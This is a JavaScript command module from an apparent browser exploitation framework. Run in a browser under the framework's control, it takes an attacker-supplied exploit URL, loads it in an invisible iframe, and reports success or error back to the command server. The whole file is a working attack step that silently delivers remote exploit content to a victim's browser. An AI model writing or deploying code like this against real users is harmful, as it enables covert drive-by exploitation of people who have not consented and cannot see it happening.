//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
	var url = '<%= @sploit_url %>';
	if (!/https?:\/\//i.test(url)) {
		server.net.send("<%= @command_url %>", <%= @command_id %>, "error=invalid url");
		return;
	}
	var sploit = server.dom.createInvisibleIframe();
        sploit.src = url;
	server.net.send("<%= @command_url %>", <%= @command_id %>, "result=IFrame Created!");
});
